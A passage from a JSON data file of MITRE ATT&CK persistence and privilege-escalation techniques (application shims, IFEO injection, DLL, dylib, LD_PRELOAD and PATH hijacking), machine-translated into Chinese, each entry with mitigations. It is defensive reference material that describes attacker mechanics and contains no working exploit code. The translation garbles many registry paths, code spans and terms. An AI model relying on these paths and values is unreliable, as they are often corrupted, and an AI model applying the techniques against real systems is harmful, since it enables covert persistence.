          "content": "对手可以通过执行由应用程序垫片触发的恶意内容来建立持久性和/或提升特权。创建了Microsoft Windows应用程序兼容性基础架构/框架（应用程序SHIM），以允许软件向后兼容，因为操作系统代码库会随着时间的推移而变化。例如，应用程序的功能使开发人员可以将修复程序应用于为Windows XP创建的应用程序（无需重写代码），以便它可以与Windows 10一起使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在框架内，创建垫片是为了充当程序（或更具体地说是导入地址表）和Windows OS之间的缓冲区。执行程序后，引用垫片缓存以确定程序是否需要使用SHIM数据库（.sdb）。如果是这样，SHIM数据库使用挂钩根据需要重定向代码，以与OS通信。"
        }
      ],
      [
        {
          "type": "text",
          "content": "默认Windows Installer（sdbinst.exe）当前安装的所有垫片的列表都保存在："
        }
      ],
      [
        {
          "type": "list",
          "content": "％windir％\\ apppatch \\ sysmain.sdb和"
        },
        {
          "type": "list",
          "content": "HKLM \\ Software \\ Microsoft \\ Windows NT \\ CurrentVersion \\ AppCompatflags \\ installedsdb"
        }
      ],
      [
        {
          "type": "text",
          "content": "自定义数据库存储在："
        }
      ],
      [
        {
          "type": "list",
          "content": "％windir％\\ apppatch \\ custom＆％windir％\\ apppatch \\ apppatch64 \\自定义和"
        },
        {
          "type": "list",
          "content": "HKLM \\ Software \\ Microsoft \\ Windows NT \\ Currentversion \\ AppCompatflags \\自定义"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了确保垫片安全，Windows设计它们以在用户模式下运行，以便它们无法修改内核，并且您必须拥有管理员特权来安装垫片。但是，某些垫片可用于绕过用户帐户控制（UAC和REDIRECTEXE），将DLL注入进程（InjectDll），禁用数据执行预防（DISABLENX）和结构异常处理（DISABLESEH）以及拦截内存地址（GetProcadDress）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "利用这些垫片可能会允许对手执行几种恶意行为，例如提升特权，安装后门，禁用Windows Defender等防御措施等。还可以滥用SHIMS来通过不断受到影响的程序调用来确立持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "Microsoft发布了一个可选的补丁更新-KB3045645-将删除sdbinst.exe中的“自动级别”标志。这将防止使用应用程序绕过UAC。"
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "用户帐户控制",
        "description": [
          [
            {
              "type": "text",
              "content": "将UAC设置更改为“始终通知”，当请求UAC高程时，将使用户更具可见性，但是，由于持续的UAC中断，此选项在用户中不会流行。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.012",
    "name": "Image File Execution Options Injection",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行图像文件执行选项（IFEO）辩论者触发的恶意内容来建立持久性和/或提升特权。IFEOS使开发人员能够将调试器附加到应用程序。创建过程时，将在应用程序的IFEO中出现的调试器将被预先介绍到该应用程序的名称，从而有效地启动调试器下的新过程（例如，<code> c：\\ dbg \\ ntsd.exe -g notepad.exe </ exe </代码>）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "IFEO可以通过注册表或全局标志通过GFLAGS工具设置。ifeos表示为"
        },
        {
          "type": "code",
          "content": " debugger "
        },
        {
          "type": "text",
          "content": "在"
        },
        {
          "type": "code",
          "content": " hklm \\ software下的注册表中的值{\\ wow6432node} \\ microsoft \\ microsoft \\ windows nt \\ windows nt \\ currentversion \\ currentversion \\ image file file excution \\ "
        },
        {
          "type": "text",
          "content": "在其中> </code>是附加调试器的二进制文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当指定程序默默退出时，IFEOS还可以启动任意监视程序（即已过早终止或第二个非内核模式流程）。与辩论者类似，可以通过GFLAG和/或直接修改IFEO和静音过程退出注册表值"
        },
        {
          "type": "code",
          "content": " HKEY_LOCAL_MACHINE \\ SOFTWORN \\ MICROSOFT \\ MICROSOFT \\ MICROSOFT \\ Windows NT \\ CurrentVersion \\ SilentProcessExit \\ "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "类似于Windows Vista和后来以及Windows Server 2008及以后的可访问性功能，可以修改注册表密钥，以配置“ cmd.exe”或其他提供后门访问的程序，作为可访问性程序的“调试器”（例如：utilman.exe）。修改注册表后，在键盘上或与远程桌面协议连接时，在登录屏幕上按适当的键组合将导致“调试器”程序使用系统特权执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "与过程注入类似，也可能会滥用这些值，以通过在计算机上单独的过程中加载恶意可执行文件来获得特权升级。安装IFEO机制也可以通过连续触发的调用提供持久性。"
        }
      ],
      [
        {
          "type": "text",
          "content": "恶意软件还可以使用IFEO来通过注册重定向并有效禁用各种系统和安全应用程序的无效辩论者来损害防御。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1546.013",
    "name": "PowerShell Profile",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行PowerShell配置文件触发的恶意内容来获得持久性并提高特权。PowerShell配置文件（"
        },
        {
          "type": "code",
          "content": " profile.ps1 "
        },
        {
          "type": "text",
          "content": "）是一个脚本，当PowerShell启动并可以用作登录脚本来自定义用户环境。"
        }
      ],
      [
        {
          "type": "text",
          "content": "PowerShell根据用户或主机程序支持多个配置文件。例如，PowerShell主机程序可能会有不同的配置文件，例如PowerShell控制台，PowerShell ISE或Visual Studio Code。管理员还可以配置适用于本地计算机上所有用户和主机程序的配置文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以修改这些配置文件以包括任意命令，功能，模块和/或PowerShell驱动器以获得持久性。每当用户打开PowerShell会话时，除非启动"
        },
        {
          "type": "code",
          "content": " noprofile "
        },
        {
          "type": "text",
          "content": "标志，否则将执行修改的脚本。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果在PowerShell配置文件中的脚本由具有较高特权的帐户（例如域管理员）加载和执行的脚本，则对手也可以升级特权。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "强制执行仅签名的PowerShell脚本。签名配置文件以避免修改它们。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "使PowerShell配置不变，并且只能由某些管理员改变，将限制对手轻松创建用户级别持久性的能力。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "如果不需要，请避免使用PowerShell概况。远程执行PowerShell脚本时，请使用-NO配置文件标志，以防止局部配置文件和脚本执行。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.014",
    "name": "Emond",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行事件监视器守护程序（EMOND）触发的恶意内容来获得持久性并提高特权。Emond是一个发射守护程序，它接受来自各种服务的事件，通过简单的规则引擎运行并采取行动。"
        },
        {
          "type": "code",
          "content": "/sbin/emond "
        },
        {
          "type": "text",
          "content": "的Emond二进制文件将加载"
        },
        {
          "type": "code",
          "content": " /etc/emond.d/rules/"
        },
        {
          "type": "text",
          "content": "目录的任何规则，并在发生明确定义的事件后采取行动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "规则文件以PLIST格式定义了名称，事件类型和要采取的操作。事件类型的一些示例包括系统启动和用户身份验证。操作的示例是运行系统命令或发送电子邮件。如果Queuedirectories Path <Code>/private/var/var/db/emondclients </code>（在<codem>/system>/system/system/library/lunagredaemons/lunagredaemons/lunagredaemons/aighteraution/lunagredaemons/aighteraighation/aighteraunddaemons/com.apple.emond.plist </code>。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会在发生定义事件时编写一条规则来执行命令，例如系统启动或用户身份验证，滥用此服务。当启动守护程序服务以根特权执行EMOND服务时，对手也可以从管理员到根的特权升级。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑通过删除启动守护程序PLIST文件来禁用Emond。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.015",
    "name": "Component Object Model Hijacking",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行由被劫持的对象模型（COM）对象触发的恶意内容来建立持久性。COM是Windows中的系统，可以通过操作系统在软件组件之间进行交互。对各种com对象的引用存储在注册表中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用COM系统插入可以通过劫持COM参考和关系来代替合法软件执行的恶意代码，作为持久性的手段。劫持COM对象需要更改注册表来替换对合法系统组件的引用，该组件可能会导致该组件在执行时不起作用。当通过普通系统操作执行该系统组件时，对手的代码将被执行。对手可能会劫持经常使用以保持一致持久水平的对象，但不太可能破坏系统内部明显的功能，以避免系统不稳定性可能导致检测。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1546.016",
    "name": "Installer Packages",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过使用安装程序触发恶意内容的执行来建立持久性并提高特权。安装程序软件包是特定于操作系统的，并包含操作系统在系统上安装应用程序所需的资源。安装程序软件包可以包括在安装之前运行的脚本以及安装完成后。执行时，安装程序脚本可能会继承提高权限。开发人员经常使用这些脚本来准备安装，检查要求，下载依赖项并在安装后删除文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "使用合法的应用程序，对手已经分布了带有修改的安装程序脚本的应用程序来执行恶意内容。当用户安装应用程序时，可能需要授予管理权限以允许安装。在合法应用程序的安装过程结束时，MacOS "
        },
        {
          "type": "code",
          "content": " PostSinstall "
        },
        {
          "type": "text",
          "content": "脚本等内容可以使用继承的高架权限执行。对手可以使用这些脚本执行恶意可执行文件，也可以安装具有升高权限的其他恶意组件（例如启动守护程序）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "根据分布，包装安装程序脚本的Linux版本有时称为“维护程序”脚本或后安装脚本。这些脚本可以包括"
        },
        {
          "type": "code",
          "content": " preinst "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " postInst "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " prerm "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " poStrm "
        },
        {
          "type": "text",
          "content": "脚本，并在执行时作为root运行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对于Windows，Microsoft安装程序服务使用"
        },
        {
          "type": "code",
          "content": " .msi "
        },
        {
          "type": "text",
          "content": "文件来管理应用程序的安装，更新和卸载。对手已利用"
        },
        {
          "type": "code",
          "content": " prebuild "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "后构建"
        },
        {
          "type": "text",
          "content": "事件在安装.msi文件时构建之前或之后运行命令。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1574.001",
    "name": "DLL Search Order Hijacking",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持用于加载DLL的搜索顺序来执行自己的恶意有效载荷。Windows系统使用一种常见方法来寻找所需的DLL来加载到程序中。劫持DLL负载可能是为了建立持久性以及提高特权和/或逃避文件执行的限制。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过多种方式劫持DLL负载。对手可能会在一个目录中播放特洛伊木马动态链接库文件（DLL），该目录将在合法库的位置之前搜索，该图书馆将由程序请求，从而导致窗户在受害者计划要求时加载其恶意库。对手也可以通过将具有与模棱两可的DLL放置在Windows在合法的DLL之前搜索的位置中使用的恶意DLL来执行DLL预加载，也称为二进制种植攻击。通常，此位置是该程序的当前工作目录。当程序将当前目录设置为远程位置（例如Web共享）之前，远程DLL预加载攻击会发生。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以通过DLL重定向直接修改搜索顺序，在启用后（在注册表和创建重定向文件中）可能会导致程序加载其他DLL。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果将搜索订单验证程序配置为以较高的特权级别运行，则加载的对手控制的DLL也将在较高级别上执行。在这种情况下，根据程序，该技术可用于从用户到管理员或系统或从管理员到系统的特权升级，具体取决于程序。成为劫持路径受害者的程序似乎通常行事正常，因为恶意DLL可能被配置为还加载了原本要替换的合法DLL。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用能够检测企业内部系统上劫持的DLL搜索订单劫持机会并纠正它们的审计工具。PowerSploit框架之类的工具包包含动力模块，可用于探索用于劫持弱点的系统。"
            }
          ],
          [
            {
              "type": "text",
              "content": "使用Windows随附的程序sxstrace.exe以及手动检查，以检查清单文件，以了解软件中的并排问题。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可以使用新的DLL来执行此技术。通过使用能够阻止合法软件加载的DLL的应用程序控制解决方案来识别并阻止通过搜索订单劫持执行的潜在恶意软件。"
            }
          ]
        ]
      },
      {
        "id": "M1044",
        "name": "限制库加载",
        "description": [
          [
            {
              "type": "text",
              "content": "禁止远程DLL的加载。默认情况下将其包含在Windows Server 2012+中，可以通过Patch for XP+和Server 2003+获得。"
            }
          ],
          [
            {
              "type": "text",
              "content": "启用安全的DLL搜索模式，强制在目录中使用更大限制（例如"
            },
            {
              "type": "code",
              "content": "％SystemRoot％"
            },
            {
              "type": "text",
              "content": "）的目录中搜索系统DLL，在本地目录DLL之前使用（例如，用户的主目录）"
            }
          ],
          [
            {
              "type": "text",
              "content": "可以通过计算机配置> [策略]>管理模板> MSS（旧版）：MSS ：（ SafeDllSearchMode）启用安全的DLL搜索模式。关联的Windows注册表权点位于"
            },
            {
              "type": "code",
              "content": " HKLM \\ System \\ CurrentControlset \\ Control \\ Control \\ Session Manager \\ SafeDllSearchMode "
            },
            {
              "type": "text",
              "content": ""
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.002",
    "name": "DLL Side-Loading",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过侧面加载DLL执行自己的恶意有效载荷。类似于DLL搜索订单劫持，侧载涉及劫持程序加载的DLL。但是，对手不仅在程序的搜索顺序中种植DLL，而是等待受害者申请被调用，还可以通过种植然后调用合法申请来直接辅助其有效载荷，以执行其有效载荷（S）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "侧加载利用了加载程序使用的DLL搜索顺序，通过将受害者应用程序和恶意有效载荷彼此定位。对手可能会使用侧载作为掩盖他们在合法，可信赖且可能提高的系统或软件过程中执行的动作的手段。在交货和/或执行期间，可能不会标记用于侧载有效载荷的良性可执行文件。对手有效载荷也可以加密/包装或以其他方式混淆，直到加载到受信任过程的内存中为止。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1013",
        "name": "应用程序开发人员指导",
        "description": [
          [
            {
              "type": "text",
              "content": "在可能的情况下，在清单文件中包括哈希值，以帮助防止恶意库的侧面加载。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "定期更新软件以包含修复DLL侧加载漏洞的补丁。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.004",
    "name": "Dylib Hijacking",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过在运行时搜索受害者应用程序搜索的路径中，将带有预期名称的恶意动态库（Dylib）执行自己的有效载荷。动态加载程序将尝试根据搜索路径的顺序找到Dylibs。Dylibs的路径可以用"
        },
        {
          "type": "code",
          "content": " @RPath "
        },
        {
          "type": "text",
          "content": "前缀，该路径允许开发人员使用相对路径根据可执行文件的位置指定运行时使用的搜索路径数组。此外，如果使用弱链接，例如"
        },
        {
          "type": "code",
          "content": " lc_load_weak_dylib "
        },
        {
          "type": "text",
          "content": "函数，即使不存在预期的迪利布，应用程序仍将执行。弱连接使开发人员可以在添加新API时在多个MacOS版本上运行应用程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过在已确定的路径中插入带有丢失迪利布的名称的恶意迪利布来获得执行。迪利布（Dylibs）被加载到应用程序的地址空间中，使恶意迪利布（Dylib）继承了应用程序的特权级别和资源。基于该应用程序，这可能导致特权升级和不受限制的网络访问。由于在合法过程中掩盖了执行，因此该方法还可以从安全产品中逃避检测。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "设置目录访问控件，以防止文件写入应用程序的搜索路径，包括在运行应用程序的文件夹和标准Dylib文件夹中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.005",
    "name": "Executable Installer File Permissions Weakness",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持安装程序使用的二进制文件来执行自己的恶意有效载荷。这些过程可能会自动执行特定的二进制文件作为其功能的一部分或执行其他操作。如果不正确设置包含目标二进制的文件系统目录或二进制本身上的权限，则可以使用用户级权限将目标二进制覆盖并通过原始过程执行。如果原始过程和线程在较高的权限级别下运行，则替换的二进制文件也将在更高级别的权限下执行，其中可能包括系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "该技术的另一个变体可以通过利用在可执行，自提取的安装程序中常见的弱点来执行。在安装过程中，安装程序通常在"
        },
        {
          "type": "code",
          "content": "％temp％"
        },
        {
          "type": "text",
          "content": "目录中使用子目录，以解开诸如DLL，EXES或其他有效载荷之类的二进制文件。当安装程序创建子目录和文件时，他们通常不会设置适当的权限来限制写入访问权限，从而可以执行放置在子目录中或覆盖安装过程中使用的二进制文件中的不信任代码。此行为与DLL搜索顺序劫持有关，并且可能会利用DLL搜索顺序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用这种技术用恶意替代合法的二进制文件，作为在较高权限级别执行代码的一种手段。某些安装程序还可能需要提高特权，这将在执行对手控制的代码时会导致特权升级。此行为与绕过用户帐户控制有关。已经向软件供应商报告了现有普通安装程序中这种弱点的几个示例。如果将执行过程设置为在特定时间或在某个事件中运行（例如，系统启动），则该技术也可以用于持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用能够检测企业内部系统上文件系统权限滥用机会并纠正它们的审计工具。诸如PowerSploit框架之类的工具包包含可用于探索服务文件系统权限弱点的系统的动力模块。"
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "用户帐户控制",
        "description": [
          [
            {
              "type": "text",
              "content": "关闭标准用户的UAC的特权高程"
            },
            {
              "type": "code",
              "content": " [HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ Windows \\ CurrentVersion \\ Curstrion \\ Policies \\ System] "
            },
            {
              "type": "text",
              "content": " </code>自动拒绝高程请求，添加："
            },
            {
              "type": "code",
              "content": "  “ consentpromptpromptpromptbehavioruser”代码>。考虑通过添加以下方式为所有用户启用安装程序检测：“ eNableInstallerDetection” = dword：00000001 "
            },
            {
              "type": "text",
              "content": "。这将提示安装密码，并记录尝试。为了禁用安装程序检测，请添加："
            },
            {
              "type": "code",
              "content": "“ eNableInstallerDetection” = dword：00000000 "
            },
            {
              "type": "text",
              "content": "。这可能会在UAC检测安装程序的过程中通过剥削来防止特权的潜在提升，但将允许安装过程继续而无需记录。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户和组的特权，以便只有授权的管理员才能与服务更改和服务二进制目标路径位置进行交互。从用户目录中拒绝执行，例如文件下载目录和临时目录。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.006",
    "name": "Dynamic Linker Hijacking",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持环境变量来执行自己的恶意有效负载。动态链接器用于加载共享库。在程序的执行准备阶段中，动态链接器加载来自环境变量和文件共享库的绝对路径，例如Linux上的"
        },
        {
          "type": "code",
          "content": " ld_preload "
        },
        {
          "type": "text",
          "content": "，或"
        },
        {
          "type": "code",
          "content": " dyld_insert_libraries "
        },
        {
          "type": "text",
          "content": " MacOS上的"
        },
        {
          "type": "code",
          "content": " dyld_insert_libraries "
        },
        {
          "type": "text",
          "content": "。环境变量中指定的库首先加载，优先于具有相同功能名称的系统库。这些变量通常被开发人员使用来调试二进制文件，而无需重新编译，解除映射的符号，并在不更改原始库的情况下实现自定义功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux和MacOS上，劫持动态链接器变量可能会授予对受害者进程的内存，系统/网络资源以及可能提高特权的访问。由于在合法过程中掩盖了执行，因此该方法还可以从安全产品中逃避检测。对手可以使用"
        },
        {
          "type": "code",
          "content": "导出"
        },
        {
          "type": "text",
          "content": "命令，"
        },
        {
          "type": "code",
          "content": " setEnv "
        },
        {
          "type": "text",
          "content": "函数或"
        },
        {
          "type": "code",
          "content": " putenv "
        },
        {
          "type": "text",
          "content": "函数来通过命令行设置环境变量。对手还可以利用动态链接器劫持将变量在外壳中导出变量，或使用更高级别的语法以python的"
        },
        {
          "type": "code",
          "content": " os.environ "
        },
        {
          "type": "text",
          "content": "进行编程设置变量。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux上，对手可能会设置"
        },
        {
          "type": "code",
          "content": " ld_preload "
        },
        {
          "type": "text",
          "content": "指向受害者计划要求的合法库名称的恶意库，从而导致操作系统在执行受害者程序后加载对手的恶意代码。"
        },
        {
          "type": "code",
          "content": "可以通过环境变量或 /etc/ld.so.preload "
        },
        {
          "type": "text",
          "content": "文件设置LD_PRELOAD </code>。"
        },
        {
          "type": "code",
          "content": " ld_preload "
        },
        {
          "type": "text",
          "content": "指定的库被加载并通过"
        },
        {
          "type": "code",
          "content": " dlopen（）"
        },
        {
          "type": "text",
          "content": " and </code> mmap（）</code>分别映射到内存中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在MacOS上，此行为在概念上与Linux相同，仅在较低级别实现MacOS动态库（DYLD）方面有所不同。对手可以设置"
        },
        {
          "type": "code",
          "content": " dyld_insert_libraries "
        },
        {
          "type": "text",
          "content": "环境变量，以指向包含合法库的名称或受害者程序要求的功能的恶意库。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可以使用新的有效载荷来执行此技术。通过使用应用程序控制解决方案来识别并阻止通过劫持执行的潜在恶意软件，也能够阻止合法软件加载的库。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "当MacOS中启用系统完整性保护（SIP）时，执行受保护的二进制文件时，上述环境变量将被忽略。第三方应用程序还可以利用苹果的固定运行时，确保这些环境变量受到限制。管理员可以通过设置setUID和/或setGid位，使用权利或在马赫-o二进制中具有__-restrict段来增加应用程序的限制。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.007",
    "name": "Path Interception by PATH Environment Variable",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持用于加载库的环境变量来执行自己的恶意有效载荷。路径环境变量包含一个目录（用户和系统）列表，该操作系统会顺序搜索以搜索从脚本或命令行调用的二进制文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以将恶意程序放在存储在路径环境变量中的目录列表中的较早条目中，从而导致操作系统在通过该路径列表中顺序搜索时执行恶意二进制文件，而不是合法的二进制。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，在Windows上，如果对手在"
        },
        {
          "type": "code",
          "content": " c：\\ compend path path "
        },
        {
          "type": "text",
          "content": "中放置了一个名为“ net.exe”的恶意程序，那么默认情况下，该程序在"
        },
        {
          "type": "code",
          "content": " c：\\ windows \\ windows \\ system32 \\ net.exe "
        },
        {
          "type": "text",
          "content": "在路径环境变量中，当从命令行执行“ net”时，将调用"
        },
        {
          "type": "code",
          "content": " c：\\示例路径"
        },
        {
          "type": "text",
          "content": "，而不是系统的合法可执行文件，请"
        },
        {
          "type": "code",
          "content": " c：\\ windows\\ system32 \\ net.exe "
        },
        {
          "type": "text",
          "content": "。执行程序的一些方法依赖于路径环境变量来确定未给出程序路径时搜索的位置，例如从命令和脚本解释器执行程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以直接修改$路径变量指定要搜索的目录。对手可以修改"
        },
        {
          "type": "code",
          "content": " $ path "
        },
        {
          "type": "text",
          "content": "变量，以指向他们已写入访问的目录。当调用使用$路径变量的程序时，OS搜索指定的目录并执行恶意二进制。在MacOS上，也可以通过修改$ HOME变量来执行此操作。这些变量可以使用命令行，启动CTL，UNIX shell配置修改或修改"
        },
        {
          "type": "code",
          "content": " /etc/paths.d "
        },
        {
          "type": "text",
          "content": "文件夹内容进行修改。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "在程序配置文件，脚本，路径环境变量，服务和快捷方式中查找并消除路径拦截弱点，并在函数允许时带有引号的路径变量。请注意Windows搜索顺序用于执行或加载二进制文件，并在适当的地方使用完全合格的路径。"
            }
          ],
          [
            {
              "type": "text",
              "content": "卸载软件时，请清理旧的Windows注册表键，以避免没有相关合法二进制文件的键。定期搜索并纠正或报告使用使用不安全路径配置报告软件的自定义或可用工具引入的系统上的路径拦截弱点。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可能需要将新的二进制文件放在通过这种弱点来执行的位置。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以在适当的情况下使用应用程序控制工具来识别并阻止潜在的恶意软件执行路径截距。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保设置适当的权限和目录访问控制，以拒绝用户将文件写入顶级目录"
            },
            {
              "type": "code",
              "content": " c："
            },
            {
              "type": "text",
              "content": "和系统目录，例如<code> c：\\ windows \\ </code，>，以减少可以放置恶意文件执行的地方。要求将所有可执行文件放在写保护目录中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.008",
    "name": "Path Interception by Search Order Hijacking",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持用于加载其他程序的搜索顺序来执行自己的恶意有效载荷。由于某些程序没有使用完整路径调用其他程序，因此对手可能会将自己的文件放置在呼叫程序所在的目录中，从而应调用程序的要求启动操作系统启动其恶意软件。"
        }
      ],
      [
        {
          "type": "text",
